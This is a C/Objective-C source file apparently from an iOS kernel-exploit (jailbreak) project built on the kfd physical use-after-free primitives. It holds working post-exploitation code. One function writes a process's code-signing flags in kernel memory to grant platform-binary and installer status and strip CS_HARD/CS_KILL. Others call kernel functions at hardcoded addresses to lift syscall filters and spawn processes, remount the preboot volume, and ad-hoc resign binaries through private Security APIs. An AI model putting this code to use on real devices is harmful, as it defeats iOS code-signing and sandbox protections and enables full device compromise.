/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include <stdint.h>

uint64_t kopen_intermediate(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method);
void kclose_intermediate(uint64_t kfd);
void stage2(uint64_t kfd);

uint64_t kcall(uint64_t kfd, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6);

#include "libkfd.h"

uint64_t kalloc_data_extern = 0;
uint64_t kalloc(uint64_t kfd, size_t size) {
    if (kalloc_data_extern == 0) {
        return 0;
    }
    
    printf("kfd: 0x%02llX\n", kfd); sleep(1);
    
    return kcall(kfd, kalloc_data_extern + ((struct kfd*)(kfd))->info.kernel.kernel_slide, 0x4000, 0, 0, 0, 0, 0, 0);
}

struct kfd* kfd_struct(uint64_t kfd) {
    return ((struct kfd*)(kfd));
}

size_t kwritebuf(uint64_t kfd, uint64_t where, const void *p, size_t size);

uint64_t dirty_kalloc(u64 kfd, size_t size);

#include <spawn.h>

int     posix_spawnattr_set_persona_np(const posix_spawnattr_t * __restrict, uid_t, uint32_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));

#include <Foundation/Foundation.h>
#include <Security/Security.h>
#include <TargetConditionals.h>

#ifdef __cplusplus
extern "C" {
#endif

#if TARGET_OS_OSX
#include <Security/SecCode.h>
#include <Security/SecStaticCode.h>
#else

// CSCommon.h
typedef struct CF_BRIDGED_TYPE(id) __SecCode const* SecStaticCodeRef; /* code on disk */

typedef CF_OPTIONS(uint32_t, SecCSFlags) {
    kSecCSDefaultFlags = 0, /* no particular flags (default behavior) */

    kSecCSConsiderExpiration = 1U << 31,     /* consider expired certificates invalid */
    kSecCSEnforceRevocationChecks = 1 << 30, /* force revocation checks regardless of preference settings */
    kSecCSNoNetworkAccess = 1 << 29,         /* do not use the network, cancels "kSecCSEnforceRevocationChecks"  */
    kSecCSReportProgress = 1 << 28,          /* make progress report call-backs when configured */
    kSecCSCheckTrustedAnchors = 1 << 27,     /* build certificate chain to system trust anchors, not to any self-signed certificate */
    kSecCSQuickCheck = 1 << 26,              /* (internal) */
    kSecCSApplyEmbeddedPolicy = 1 << 25,     /* Apply Embedded (iPhone) policy regardless of the platform we're running on */
};

typedef CF_OPTIONS(uint32_t, SecPreserveFlags) {
    kSecCSPreserveIdentifier = 1 << 0,
    kSecCSPreserveRequirements = 1 << 1,
    kSecCSPreserveEntitlements = 1 << 2,
    kSecCSPreserveResourceRules = 1 << 3,
    kSecCSPreserveFlags = 1 << 4,
    kSecCSPreserveTeamIdentifier = 1 << 5,
    kSecCSPreserveDigestAlgorithm = 1 << 6,
    kSecCSPreservePreEncryptHashes = 1 << 7,
    kSecCSPreserveRuntime = 1 << 8,
};

// SecStaticCode.h
OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes,
                                                  SecStaticCodeRef* __nonnull CF_RETURNS_RETAINED staticCode);

// SecCode.h
CF_ENUM(uint32_t){
    kSecCSInternalInformation = 1 << 0, kSecCSSigningInformation = 1 << 1, kSecCSRequirementInformation = 1 << 2,
    kSecCSDynamicInformation = 1 << 3,  kSecCSContentInformation = 1 << 4, kSecCSSkipResourceDirectory = 1 << 5,
    kSecCSCalculateCMSDigest = 1 << 6,
};

OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef* __nonnull CF_RETURNS_RETAINED information);

extern const CFStringRef kSecCodeInfoEntitlements;    /* generic */
extern const CFStringRef kSecCodeInfoIdentifier;      /* generic */
extern const CFStringRef kSecCodeInfoRequirementData; /* Requirement */

#endif

// SecCodeSigner.h
#ifdef BRIDGED_SECCODESIGNER
typedef struct CF_BRIDGED_TYPE(id) __SecCodeSigner* SecCodeSignerRef SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#else
typedef struct __SecCodeSigner* SecCodeSignerRef SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#endif

extern const CFStringRef kSecCodeSignerEntitlements SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerIdentifier SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerIdentity SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerPreserveMetadata SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerRequirements SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
extern const CFStringRef kSecCodeSignerResourceRules SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));

#ifdef BRIDGED_SECCODESIGNER
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags, SecCodeSignerRef* __nonnull CF_RETURNS_RETAINED signer)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#else
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags, SecCodeSignerRef* signer)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));
#endif

OSStatus SecCodeSignerAddSignatureWithErrors(SecCodeSignerRef signer, SecStaticCodeRef code, SecCSFlags flags, CFErrorRef* errors)
    SPI_AVAILABLE(macos(10.5), ios(15.0), macCatalyst(13.0));

// SecCodePriv.h
extern const CFStringRef kSecCodeInfoResourceDirectory; /* Internal */

#ifdef __cplusplus
}
#endif

int resignFile(NSString *filePath, bool preserveMetadata)
{
    OSStatus status = 0;
    int retval = 200;

    // the special value "-" (dash) indicates ad-hoc signing
    SecIdentityRef identity = (SecIdentityRef)kCFNull;
    NSMutableDictionary* parameters = [[NSMutableDictionary alloc] init];
    parameters[(__bridge NSString*)kSecCodeSignerIdentity] = (__bridge id)identity;
    if (preserveMetadata) {
        parameters[(__bridge NSString*)kSecCodeSignerPreserveMetadata] = @(kSecCSPreserveIdentifier | kSecCSPreserveRequirements | kSecCSPreserveEntitlements | kSecCSPreserveResourceRules);
    }

    SecCodeSignerRef signerRef;
    status = SecCodeSignerCreate((__bridge CFDictionaryRef)parameters, kSecCSDefaultFlags, &signerRef);
    if (status == 0) {
        SecStaticCodeRef code;
        status = SecStaticCodeCreateWithPathAndAttributes((__bridge CFURLRef)[NSURL fileURLWithPath:filePath], kSecCSDefaultFlags, NULL, &code);
        if (status == 0) {
            status = SecCodeSignerAddSignatureWithErrors(signerRef, code, kSecCSDefaultFlags, NULL);
            if (status == 0) {
                CFDictionaryRef newSigningInformation;
                // Difference from codesign: added kSecCSSigningInformation, kSecCSRequirementInformation, kSecCSInternalInformation
                status = SecCodeCopySigningInformation(code, kSecCSDefaultFlags | kSecCSSigningInformation | kSecCSRequirementInformation | kSecCSInternalInformation, &newSigningInformation);
                if (status == 0) {
                    NSLog(@"SecCodeCopySigningInformation succeeded: %s", ((__bridge NSDictionary*)newSigningInformation).description.UTF8String);
                    retval = 0;
                    CFRelease(newSigningInformation);
                } else {
                    NSLog(@"SecCodeCopySigningInformation failed: %s (%d)", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
                    retval = 203;
                }
            }
            CFRelease(code);
        }
        else {
            NSLog(@"SecStaticCodeCreateWithPathAndAttributes failed: %s (%d)", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
            retval = 202;
        }
        CFRelease(signerRef);
    }
    else {
        NSLog(@"SecCodeSignerCreate failed: %s (%d)", ((__bridge NSString*)SecCopyErrorMessageString(status, NULL)).UTF8String, status);
        retval = 201;
    }

    return retval;
}

CFTypeRef IORegistryEntryCreateCFProperty(io_registry_entry_t entry, CFStringRef key, CFAllocatorRef allocator, uint32_t options);

enum sandbox_filter_type {
    SANDBOX_FILTER_NONE,
    SANDBOX_FILTER_GLOBAL_NAME = 2,
    SANDBOX_FILTER_XPC_SERVICE_NAME = 12,
    SANDBOX_FILTER_IOKIT_CONNECTION,
};

#define SANDBOX_NAMED_EXTERNAL 0x0003

typedef struct {
    char* builtin;
    unsigned char* data;
    size_t size;
} *sandbox_profile_t;

typedef struct {
    const char **params;
    size_t size;
    size_t available;
} *sandbox_params_t;

extern const char *const APP_SANDBOX_READ;
extern const char *const APP_SANDBOX_READ_WRITE;
extern const enum sandbox_filter_type SANDBOX_CHECK_NO_REPORT;

extern const uint32_t SANDBOX_EXTENSION_NO_REPORT;
extern const uint32_t SANDBOX_EXTENSION_CANONICAL;
extern const uint32_t SANDBOX_EXTENSION_USER_INTENT;

char *sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags);
char *sandbox_extension_issue_generic(const char *extension_class, uint32_t flags);
char *sandbox_extension_issue_file_to_process(const char *extension_class, const char *path, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_mach_to_process(const char *extension_class, const char *name, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_mach(const char *extension_class, const char *name, uint32_t flags);
int sandbox_check(pid_t, const char *operation, enum sandbox_filter_type, ...);
int sandbox_check_by_audit_token(audit_token_t, const char *operation, enum sandbox_filter_type, ...);
int sandbox_container_path_for_pid(pid_t, char *buffer, size_t bufsize);
int sandbox_extension_release(int64_t extension_handle);
int sandbox_init_with_parameters(const char *profile, uint64_t flags, const char *const parameters[], char **errorbuf);
int64_t sandbox_extension_consume(const char *extension_token);
sandbox_params_t sandbox_create_params(void);
int sandbox_set_param(sandbox_params_t, const char *key, const char *value);
void sandbox_free_params(sandbox_params_t);
sandbox_profile_t sandbox_compile_file(const char *path, sandbox_params_t, char **error);
sandbox_profile_t sandbox_compile_string(const char *data, sandbox_params_t, char **error);
void sandbox_free_profile(sandbox_profile_t);
int sandbox_apply(sandbox_profile_t);

char *sandbox_extension_issue_iokit_registry_entry_class_to_process(const char *extension_class, const char *registry_entry_class, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_iokit_registry_entry_class(const char *extension_class, const char *registry_entry_class, uint32_t flags);

#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <termios.h>
#include <sys/clonefile.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <dirent.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <spawn.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <CommonCrypto/CommonDigest.h>
#include <pthread.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

struct statfs64 __DARWIN_STRUCT_STATFS64;

void fstatfs64(int fd, struct statfs64 *buf) {
    register int x0 asm("x0") = fd; // int fd
    register struct statfs64 *x1 asm("x1") = buf; // struct statfs64 *buf
    register long x16 asm("x16") = 346; // FSTATFS64 syscall number

    asm volatile("svc #0x80"
                :"=r"(x0), "=r"(x1)
                :"r"(x0), "r"(x1), "r"(x16):
                "memory",
                "cc");
}

struct hfs_mount_args {
    char    *fspec;            /* block special device to mount */
    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t hfs_encoding;    /* encoding for this volume (standard HFS only) */
    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
    int        flags;            /* mounting flags, see below */
    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
    int        journal_flags;          /* flags to pass to journal_open/create */
    int        journal_disable;        /* don't use journaling (potentially dangerous) */
};

struct apfs_mountarg {
    char *path;
    uint64_t _null;
    uint64_t apfs_flags;
    uint32_t _pad;
    char snapshot[0x100];
    char im4p[16];
    char im4m[16];
};

int mount_check(const char *mountpoint) {
    
    int ret;
    struct statfs fs;
    if ((ret = statfs(mountpoint, &fs))) {
      fprintf(stderr, "could not statfs /private/preboot: %d (%s)\n", errno, strerror(errno));
      return ret;
    }
    struct apfs_mountarg preboot_arg = {
      .path = fs.f_mntfromname,
      ._null = 0,
      .apfs_flags = 1,
      ._pad = 0,
    };
    ret = mount("apfs", "/private/preboot", MNT_UPDATE, &preboot_arg);
    if (ret) {
      fprintf(stderr, "could not remount /private/preboot: %d (%s)\n", errno, strerror(errno));
      return ret;
    }
    return ret;
}

#define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER            0x0000008    /* has installer entitlement      */
#define CS_HARD                 0x0000100    /* don't load invalid pages       */
#define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
#define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
#define CS_DEBUGGED             0x10000000
#define CS_KILL                 0x0000200

int evaluateSignature(NSURL* fileURL, NSData **cdHashOut, BOOL *isAdhocSignedOut);

void set_csflags(uint64_t kfd, uint64_t proc) {
    uint32_t csflags = kread32(kfd, proc + 0xC0);

    printf("proc->cs_flags: %02X\n", csflags);
    
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    
    printf("proc->cs_flags: %02X\n", csflags);

    kwrite32(kfd, proc + 0xC0, csflags);
    
    uint32_t task_flags = kread32(kfd, kread64(kfd, proc + 0x10) + 0x3E8);
    printf("task->t_flags: %02X\n", task_flags);
    
    kwrite32(kfd, kread64(kfd, proc + 0x10) + 0x3E8, task_flags | 0x400);
    return;
}

uint64_t proc_set_syscall_filter_mask = 0xFFFFFFF00759293C;
int set_syscallfilter(uint64_t kfd, uint64_t proc) {
    int ret;
    ret = kcall(kfd, proc_set_syscall_filter_mask + ((struct kfd*)(kfd))->info.kernel.kernel_slide, proc, 0, 0, 0, 0, 0, 0);
    ret = kcall(kfd, proc_set_syscall_filter_mask + ((struct kfd*)(kfd))->info.kernel.kernel_slide, proc, 1, 0, 0, 0, 0, 0);
    ret = kcall(kfd, proc_set_syscall_filter_mask + ((struct kfd*)(kfd))->info.kernel.kernel_slide, proc, 2, 0, 0, 0, 0, 0);
    return ret;
}

typedef void* user_addr;

struct posix_spawn_args {
    user_addr pid;
    user_addr path; // args[1]
    user_addr unknown;
    user_addr argv;
    user_addr envp;
};

static uint64_t posix_spawn_kernel = 0xFFFFFFF00757E5C4;

struct _posix_spawn_args_desc {
    __darwin_size_t        attr_size;    /* size of attributes block */
    void*    attrp;        /* pointer to block */
    __darwin_size_t    file_actions_size;    /* size of file actions block */
    void*
                file_actions;    /* pointer to block */
    __darwin_size_t    port_actions_size;     /* size of port actions block */
    void*
                port_actions;     /* pointer to port block */
    __darwin_size_t mac_extensions_size;
    void*
                mac_extensions;    /* pointer to policy-specific
                         * attributes */
};


int kposix_spawn(uint64_t kfd, pid_t * __restrict pid, const char * __restrict path,
        const posix_spawn_file_actions_t *file_actions,
        const posix_spawnattr_t * __restrict attrp,
                 char *const argv[ __restrict], char *const envp[ __restrict]) {
    
    struct _posix_spawn_args_desc adesc = {};
    
    struct posix_spawn_args args = {
        .pid = pid,
        .path = (user_addr)path,
        .unknown = (user_addr)&adesc,
        .argv = (user_addr)argv,
        .envp = (user_addr)envp
    };
    
    uint64_t kargs = dirty_kalloc(kfd, 200);
    
    kwritebuf(kfd, kargs, &args, sizeof(struct posix_spawn_args));
    
    printf("Set up syscall args\n"); sleep(1);
    
    uint64_t selfproc = ((struct kfd*)(kfd))->info.kernel.current_proc;
    uint64_t function = ((struct kfd*)(kfd))->info.kernel.kernel_slide + posix_spawn_kernel;
    
    uint64_t retval = dirty_kalloc(kfd, 200);
    
    printf("Set up parameters selfproc: 0x%02llX, function: 0x%02llX, retval: 0x%02llX\n", selfproc, function, retval); sleep(1);
    
    int32_t ret = kcall(kfd, function, selfproc, kargs, retval, 0, 0, 0, 0);
    
    int32_t realret = kread32(kfd, retval);
    
    printf("returned: %d %d\n", ret, realret); sleep(1);
    
    return realret;
}

struct trust_cache_entry1 {
    uint8_t cdhash[20];
    uint8_t hash_type;
    uint8_t flags;
} __attribute__((__packed__));
